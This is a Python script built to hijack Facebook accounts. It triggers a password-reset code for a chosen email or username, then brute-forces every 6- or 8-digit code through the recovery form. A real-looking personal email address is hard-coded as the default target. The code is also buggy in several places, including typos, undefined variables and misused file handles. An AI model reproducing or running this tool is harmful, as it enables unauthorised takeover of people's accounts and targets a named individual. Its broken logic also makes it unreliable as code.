import itertools
import sys
from time import sleep
from bs4 import BeautifulSoup
import requests
import mechanize
import os
import re
CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'

def __init__(self):
    self.browser = self.setup_browser()

def setup_browser(self):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    return browser

def sleepy(counter):
  x = counter
  y = 0
  while x > y:
    x -= 1
    z = x
    if x <= 9:
      code = ("0", str(z))
      yo = h.join(code)
      x 
      print(yo, end='\r')
    else:
      print(x, end='\r')
    sleep(1)

def passc():
  try:
    f = open("6digits.txt", "a")
    f.close()
  except:
    f = open("6digits.txt", "a+")
    for combination in itertools.product(range(10), repeat=6):
        f.write(''.join(map(str, combination)))
  try:
    z = open("8digits.txt", "a")
    z.close()
  except:
    z = open("8digits.txt", "a+")
    for combination in itertools.product(range(10), repeat=8):
      z.write(''.join(map(str, combination)))

def fb_hack(email, codex):
  soup = BeautifulSoup()
  browser = mechanize.Browser()
  browser.set_handle_robots(False)
  cookies = mechanize.CookieJar()
  browser.set_cookiejar(cookies)
  browser.addheaders = [('User-agent', MOZILLA_UAS)]
  browser.set_handle_refresh(False)
  browser.open('https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l')
  browser.select_form(nr=0)
  browser.form['email'] = email 
  browser.submit()
  browser.select_form(nr=0)
  browser.submit()
  response1 = browser.respnse()
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  test = soup.find(string='poop')
  check1 = soup.find(string=re.compile("6"))
  check2 = soup.find(string=re.compile("8"))
  check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
  check4 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
  print(check1)
  print(check2)
  print(check3)
  print(check4)
  response1 = browser.response()
  soup = BeautifulSoup(response1, 'html.parser')
  with open("output1.html", "w") as file:
    file.write(str(soup))
  with open("output1.txt", "w") as file:
    file.write(str(soup))
  if check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
    attempt = int(codex)
    print(check1)
    f = open("6digits.txt", "r")
    attempt = int(codex)
    while check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
      browser.select_form(nr=0)
      y = f.readlines(attempt)
      attempt += 1
      browser.form['n'] = y
      browser.submit()
      print(y, end='\r')
      fail = (y, "failed")
      success = (y, "succeded")
      s = " "
      with open("passcoder.txt", "a+") as z:
        f.write(str(attempt))
        f.close()
      response1 = browser.response()
      soup = BeautifulSoup(response1, 'html.parser')
      check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
      if check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
        print(s.join(fail))
        count = 30
        sleepy(count)
      else:
        soup = BeautifulSoup(response1, 'html.parser')
        if soup.find(string="password_new") == test:
          print("Password not found")
          print(browser.geturl())
          browser.close()
        else:
          print(s.join(success))
  elif check2 != test:
    print(check2)
    attempt = int(codex)
    f = open("8digits.txt", "r")
    while check2 != check4:
      browser.select_form(nr=0)
      y = f.readlines(attempt)
      attempt += 1
      browser.form['n'] = y
      browser.submit()
      print(str(y), end='\r')
      fail = (y, "failed")
      success = (y, "succeded")
      s = " "
      reset -= 1
      reset1 = reset
      with open("passcoder.txt", "a") as z:
        z.write(str(reset1))
        z.close()
      response1 = browser.response()
      soup = BeautifulSoup(response1, 'html.parser')
      check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
      if check2 != test:
        print(s.join(fail))
        count = 30
        sleepy(count)
      else:
        soup = BeautifulSoup(response1, 'html.parser')
        if soup.find(string="password_new") == test:
          print("Password not found")
          print(browser.geturl())
          print(browser.response())
          browser.close()
        else:
          print(s.join(success))
  else:
    with open("passcoder.txt", "r") as z:
      reset = z.readlines(-1)
      z.close()
    response1 = browser.response()
    soup = BeautifulSoup(response1, 'html.parser')
    print(browser.geturl())
    print(response1)
    if soup.find(string="password_new") == test:
      print("Passcode not found")
    elif soup.find(string="password_new") != test:
      print("Passcode found!")
      print(y)
      browser.close()
      reset = int(-1)
  return reset
  
  
  
  
os.system('clear')
ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
reset = int(input('Code: ') or 1)
fb_hack(ehack, reset)
